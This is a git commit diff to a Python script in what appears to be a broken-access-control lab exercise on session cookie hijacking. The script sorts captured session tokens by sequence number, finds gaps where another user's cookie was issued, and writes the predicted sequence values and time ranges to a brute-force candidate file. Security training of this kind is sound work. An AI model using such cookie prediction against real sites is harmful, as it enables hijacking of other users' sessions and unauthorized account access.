d6863962acb53ce942093e25e1adb6e781728552
James-Lu-none <jamesabcde277@gmail.com>
2024-01-19 18:40:37 +0800

    calculate possible cookies

--- brokenAccessControl/hijackingSessionCookie/cookie_prediction.py
+++ brokenAccessControl/hijackingSessionCookie/cookie_prediction.py
@@ -7,5 +7,21 @@ with open(file_path, 'r', encoding='utf-8') as file:
         line = line.strip()
         if not line: continue
         seq, epoch_time = line.replace('-', ' ').split(' ')
-        tokens.append((seq, epoch_time))
-print(tokens)
+        # print(f"{seq} {epoch_time}")
+        tokens.append((int(seq), int(epoch_time)))
+tokens = sorted(tokens, key=lambda x: x[0])
+print(tokens[0])
+dif=[]
+for i in range(len(tokens)-1):
+    s0,t0=tokens[i]
+    s1,t1=tokens[i+1]
+    # print(f"{s0} {s1}")
+    if(s1-s0==2):
+        # print(s0+1)
+        dif.append((str(s0+1) , str(t0%100), str(t1%100), str(t1-t0)))
+
+dif = sorted(dif, key=lambda x: int(x[3]),reverse=True)
+f = open("brokenAccessControl/hijackingSessionCookie/bruteForceTokens", "w")
+for i in dif:
+    f.write(" ".join(i)+'\n')
+f.close()
